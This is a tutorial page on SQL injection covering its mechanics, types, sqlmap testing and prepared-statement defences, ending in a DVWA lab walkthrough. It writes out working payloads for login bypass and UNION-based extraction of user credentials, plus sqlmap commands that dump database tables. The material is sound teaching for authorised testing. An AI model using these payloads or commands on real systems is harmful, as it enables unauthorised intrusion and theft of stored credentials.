---
title: SQL Injection (SQLi)
description: SQL injection lets attackers manipulate database queries via untrusted input. Learn how SQLi works, its types, tooling, and how prepared statements stop it.
layout: ../../layouts/MainLayout.astro
---

SQL injection (SQLi) is one of the oldest and most damaging classes of web [vulnerability](/en/page-vulnerability). It happens when an application builds a database query by pasting untrusted user input straight into the query string, letting an attacker change what the query does instead of only what it looks up.

Injection sits in the OWASP Top 10 2021 as category A03. Understanding it is essential for anyone learning [web hacking](/en/page-web-hacking) or writing code that touches a database. The material below is for testing systems you own or are explicitly authorised to assess.

<figure class="hh-video">
  <video controls preload="none" playsinline poster="/en/images/sqlmap-walkthrough-poster.png">
    <source src="/en/videos/sqlmap-walkthrough.webm" type="video/webm" />
    <source src="/en/videos/sqlmap-walkthrough.mp4" type="video/mp4" />
    Your browser does not support embedded video.
  </video>
  <figcaption>Automating SQL injection discovery and data extraction with <code>sqlmap</code> against a lab target.</figcaption>
</figure>

## How SQL Injection Works

The root cause is mixing code and data. Consider a login handler that concatenates form fields into a query:

```php
$query = "SELECT * FROM users
          WHERE username = '$user' AND password = '$pass'";
```

Type `admin` and `hunter2` and the query behaves normally. But enter `' OR '1'='1' -- ` as the username and the database receives:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '';
```

The `--` begins a SQL comment, so the password check is discarded entirely. Because `'1'='1'` is always true, the `WHERE` clause now matches every row, and the application logs the attacker in as the first user in the table, often an administrator, without a valid password. That single quote is the whole problem: it lets input escape the data context and become part of the SQL.

The same flaw exposes far more than logins. Attackers use it to dump entire tables, read or write files, and in some configurations execute operating-system commands, turning a form field into a foothold on the [host](/en/page-host).

## Types of SQL Injection

**In-band (classic) SQLi** uses the same channel to inject and to read results. A `UNION SELECT` attack appends attacker-controlled columns to a legitimate query so extracted data appears directly in the page. Error-based SQLi coaxes the database into leaking data inside its error messages.

**Blind (inferential) SQLi** applies when the app is vulnerable but shows no data or errors. The attacker asks true/false questions and reads the answer from side effects: whether the page content changes (boolean-based) or how long the response takes (time-based, using functions like `SLEEP()`). Data is recovered one character at a time, which is slow but reliable.

**Out-of-band SQLi** forces the database to make an outbound DNS or HTTP request to a server the attacker controls, exfiltrating data through a separate channel. It is useful when in-band and blind techniques are blocked.

## Testing and Tooling

Manual testing starts by probing inputs with a single quote, `'`, and watching for errors, redirects, or broken output. Confirm with paired payloads such as `1' AND '1'='1` versus `1' AND '1'='2` to see whether the response tracks a true/false condition.

To automate the tedious parts, [Burp Suite](/en/page-burp-suite) intercepts and replays requests, while `sqlmap` fingerprints the database and extracts data:

```bash
# Test a parameter you are authorised to assess
sqlmap -u "https://target.example/item?id=1" -p id --batch

# Enumerate databases, then dump a table
sqlmap -u "https://target.example/item?id=1" --dbs
sqlmap -u "https://target.example/item?id=1" -D shop -T users --dump
```

For hands-on practice, run these tools against deliberately vulnerable targets like DVWA or the labs in [CTF challenges](/en/page-ctf-challenges), never against systems you lack permission to test. See [legal and ethical considerations](/en/page-legal-ethical) before you begin.

## Defending Against SQLi

SQL injection is preventable, and the fix is well understood.

**Use parameterised queries (prepared statements).** Send the SQL structure and the user data to the database separately so input is always treated as a value, never as executable code. Even `' OR '1'='1` becomes a harmless search for a literal username.

```php
$stmt = $pdo->prepare(
    'SELECT * FROM users WHERE username = ? AND password_hash = ?'
);
$stmt->execute([$user, $hash]);
```

Layer additional defences on top: validate and constrain input, use an ORM or query builder that parameterises by default, apply least-privilege database accounts so a compromised query cannot drop tables, and store passwords as salted hashes rather than plaintext. A web application firewall can filter obvious payloads, but treat it as a backstop, not the primary control. These practices are part of broader [secure coding](/en/page-secure-coding) discipline.

## Hands-on Lab: UNION-based Extraction in DVWA

Do this only inside a lab you control. The Damn Vulnerable Web Application (DVWA) is the standard target, and the quickest route is a disposable container on a [virtual machine](/en/page-3) you own.

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

Browse to `http://localhost`, log in with `admin` / `password`, click "Create / Reset Database", then set DVWA Security to **low** on the Security tab. Open the **SQL Injection** page; its `id` field is the injectable parameter.

**1. Find the column count.** Submit increasing values until the query breaks:

```text
1' ORDER BY 1 -- -
1' ORDER BY 2 -- -
1' ORDER BY 3 -- -
```

`ORDER BY 3` throws an "Unknown column" error, so the query returns two columns.

**2. Confirm the injection point** with a `UNION` that matches that width:

```text
1' UNION SELECT 1,2 -- -
```

Both placeholders should echo back on the page.

**3. Fingerprint and dump.** Swap the constants for real expressions, then read the credential table:

```text
1' UNION SELECT user(),version() -- -
1' UNION SELECT user,password FROM users -- -
```

You now hold the DVWA admin's username and its MD5 password hash, achieved without a valid login.

**4. Reproduce it with automation.** Copy your `PHPSESSID` from the browser's developer tools and hand it to `sqlmap`:

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=PASTE_HERE; security=low" \
  -p id -D dvwa -T users --dump --batch
```

Compare what you extracted by hand against the tool's output. Then raise DVWA's security to **medium** and **high** and watch each payload fail, one level at a time. That progression is the fastest way to see why the [defences above](/en/page-secure-coding) actually work.
